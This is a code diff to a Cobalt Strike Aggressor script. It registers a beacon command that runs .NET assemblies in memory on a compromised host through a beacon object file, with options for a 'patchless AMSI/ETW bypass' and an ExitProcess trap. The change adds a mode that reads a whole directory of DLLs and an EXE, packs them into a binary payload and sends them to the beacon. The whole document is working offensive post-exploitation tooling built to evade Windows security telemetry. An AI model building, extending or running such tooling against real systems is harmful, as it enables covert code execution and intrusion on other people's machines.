@@ -1,17 +1,26 @@
 beacon_command_register(
     "senjata-execute-assembly",
     "Run a .NET assembly with patchless AMSI/ETW bypass + ExitProcess trap",
-    "Synopsis: senjata-execute-assembly --dotnetassembly /path/to/Assembly.exe [--amsi] [--etw] [--mailslot] [--appdomain name] [--main] [--assemblyargs <args>]");
+    "Synopsis:\n  senjata-execute-assembly --dotnetassembly /path/to/Assembly.exe [opts]\n  senjata-execute-assembly --dotnetassemblydir /path/to/dir/ [opts]\n\nOptions: [--amsi] [--etw] [--mailslot] [--appdomain name] [--main] [--assemblyargs <args>]");
 
 global('$default_appDomain $default_pipeName $default_mailSlotName');
 $default_appDomain    = "totesLegit";
 $default_pipeName     = "totesLegit";
 $default_mailSlotName = "totesLegit";
 
+# Pack a u32 little-endian as a 4-byte binary string. Sleep's pack("<i",...)
+# is unreliable for endianness across CS versions; we encode manually.
+sub u32le {
+    local('$n');
+    $n = $1;
+    return chr($n & 0xFF) . chr(($n >> 8) & 0xFF) . chr(($n >> 16) & 0xFF) . chr(($n >> 24) & 0xFF);
+}
+
 alias senjata-execute-assembly {
-    local('$bid $data @args $_amsi $_etw $_mailSlot $_entryPoint $_dotNetAssembly');
+    local('$bid $data @args $_amsi $_etw $_mailSlot $_entryPoint $_dotNetAssembly $_dotNetDir');
     local('$_appDomain $_mailSlotName $_pipeName $_assemblyWithArgs $i $j $count');
-    local('@_dotNetAssemblyArgs $assemblyLength $assemblyBytes $bofPath $handle $bof $bofArgs');
+    local('@_dotNetAssemblyArgs $assemblyBytes $bofPath $handle $bof $bofArgs');
+    local('$mode $mainName $payload $f $fpath $fname $body @entries');
 
     $bid  = $1;
     $data = substr($0, strlen("senjata-execute-assembly "));
@@ -22,6 +31,7 @@ alias senjata-execute-assembly {
     $_mailSlot = 0;
     $_entryPoint = 1;
     $_dotNetAssembly = "";
+    $_dotNetDir = "";
     $_appDomain = "";
     $_mailSlotName = "";
     $_pipeName = "";
@@ -45,6 +55,10 @@ alias senjata-execute-assembly {
             $i = $i + 1;
             $_dotNetAssembly = @args[$i];
         }
+        else if (@args[$i] eq "--dotnetassemblydir") {
+            $i = $i + 1;
+            $_dotNetDir = @args[$i];
+        }
         else if (@args[$i] eq "--appdomain") {
             $i = $i + 1;
             $_appDomain = @args[$i];
@@ -62,7 +76,7 @@ alias senjata-execute-assembly {
             $count = 0;
             for ($j = $i; $j < size(@args); $j++) {
                 if (@args[$j] eq "--amsi" || @args[$j] eq "--etw" || @args[$j] eq "--mailslot" || @args[$j] eq "--main"
-                 || @args[$j] eq "--dotnetassembly" || @args[$j] eq "--appdomain" || @args[$j] eq "--slotname"
+                 || @args[$j] eq "--dotnetassembly" || @args[$j] eq "--dotnetassemblydir" || @args[$j] eq "--appdomain" || @args[$j] eq "--slotname"
                  || @args[$j] eq "--pipename" || @args[$j] eq "--assemblyargs") {
                     break;
                 }
@@ -78,13 +92,21 @@ alias senjata-execute-assembly {
     if ($_mailSlotName eq "") { $_mailSlotName = $default_mailSlotName; }
     if ($_pipeName eq "")     { $_pipeName     = $default_pipeName;     }
 
-    # Validate
-    if ($_dotNetAssembly eq "") {
-        berror($bid, "[-] --dotnetassembly is required");
+    # Validate: exactly one of --dotnetassembly or --dotnetassemblydir
+    if ($_dotNetAssembly eq "" && $_dotNetDir eq "") {
+        berror($bid, "[-] one of --dotnetassembly or --dotnetassemblydir is required");
         return;
     }
-    if (!-exists $_dotNetAssembly || !-isFile $_dotNetAssembly) {
+    if ($_dotNetAssembly ne "" && $_dotNetDir ne "") {
+        berror($bid, "[-] cannot use both --dotnetassembly and --dotnetassemblydir");
+        return;
+    }
+    if ($_dotNetAssembly ne "" && (!-exists $_dotNetAssembly || !-isFile $_dotNetAssembly)) {
         berror($bid, "[-] File ".$_dotNetAssembly." does not exist");
+        return;
+    }
+    if ($_dotNetDir ne "" && (!-exists $_dotNetDir || !-isDir $_dotNetDir)) {
+        berror($bid, "[-] Dir ".$_dotNetDir." does not exist");
         return;
     }
 
@@ -113,21 +135,85 @@ alias senjata-execute-assembly {
         return;
     }
 
-    # Read the .NET assembly
-    $handle = openf($_dotNetAssembly);
-    $assemblyLength = lof($_dotNetAssembly);
-    $assemblyBytes  = readb($handle, -1);
-    closef($handle);
+    # Build payload + mode + main_name
+    if ($_dotNetAssembly ne "") {
+        # Single-file mode
+        $mode = 0;
+        $mainName = "";
+        $handle = openf($_dotNetAssembly);
+        $payload = readb($handle, -1);
+        closef($handle);
+    }
+    else {
+        # Multi-file mode: pack [n_files: u32] [name_len:u32][name][body_len:u32][body] ...
+        $mode = 1;
+        $mainName = "";
+        @entries = @();
+        # Normalize trailing slash
+        if ($_dotNetDir endsWith "/" || $_dotNetDir endsWith "\\") {
+            $_dotNetDir = substr($_dotNetDir, 0, strlen($_dotNetDir) - 1);
+        }
+        # Use Java's File API directly via Sleep bridge — works across Sleep
+        # versions. ls() behavior varies; this is deterministic.
+        local('$javaDir @listed $javaFile');
+        $javaDir = [new java.io.File: $_dotNetDir];
+        @listed = [$javaDir listFiles];
+        if (size(@listed) == 0) {
+            @listed = ls($_dotNetDir);
+        }
+        foreach $javaFile (@listed) {
+            $fpath = "$javaFile";
+            $fname = getFileName($fpath);
+            if (-isFile $fpath && ($fname ismatch ".+\\.dll\$" || $fname ismatch ".+\\.exe\$")) {
+                # Skip facade/framework DLLs already loaded in Beacon's CLR;
+                # re-loading them via Load_3 conflicts with the existing
+                # versions and can crash the CLR.
+                if ($fname ismatch "^(System\\.|Microsoft\\.|mscorlib|netstandard).*\\.dll\$") {
+                    continue;
+                }
+                # Use lof() for the exact byte size — strlen() on binary
+                # buffers stops at the first NUL (managed PE bytes have NULs
+                # everywhere, including offset 3 of the MZ header).
+                $bodyLen = lof($fpath);
+                $handle = openf($fpath);
+                $body = readb($handle, $bodyLen);
+                closef($handle);
+                push(@entries, @($fname, $body, $bodyLen));
+                if ($mainName eq "" && $fname ismatch ".+\\.exe\$") {
+                    $mainName = $fname;
+                }
+            }
+        }
+        if (size(@entries) == 0) {
+            berror($bid, "[-] No files in ".$_dotNetDir);
+            return;
+        }
+        if ($mainName eq "") {
+            berror($bid, "[-] No .exe found in ".$_dotNetDir." (need exactly one)");
+            return;
+        }
+        $payload = u32le(size(@entries));
+        foreach $f (@entries) {
+            $fname = $f[0];
+            $body = $f[1];
+            $bodyLen = $f[2];  # exact byte size from lof(), not strlen on binary
+            $payload = $payload . u32le(strlen($fname)) . $fname . u32le($bodyLen) . $body;
+        }
+    }
 
     # Pack args matching senjata-execute-assembly args.rs:
     #   z app_domain | i amsi | i etw | i mailslot | i entry_point
-    #   z slot_name | z pipe_name | z asm_args | b asm_bytes
-    $bofArgs = bof_pack($bid, "ziiiizzzb",
+    #   z slot_name | z pipe_name | z asm_args | i mode | z main_name | b payload
+    $bofArgs = bof_pack($bid, "ziiiizzzizb",
         $_appDomain, $_amsi, $_etw, $_mailSlot, $_entryPoint,
         $_mailSlotName, $_pipeName, $_assemblyWithArgs,
-        $assemblyBytes);
+        $mode, $mainName, $payload);
 
-    btask($bid, "Running senjata-execute-assembly (".$_dotNetAssembly.")");
+    if ($_dotNetDir ne "") {
+        btask($bid, "Running senjata-execute-assembly (dir=".$_dotNetDir.", main=".$mainName.", ".size(@entries)." files)");
+    } else {
+        btask($bid, "Running senjata-execute-assembly (".$_dotNetAssembly.")");
+    }
     beacon_inline_execute($bid, $bof, "go", $bofArgs);
 
     clear(@_dotNetAssemblyArgs);
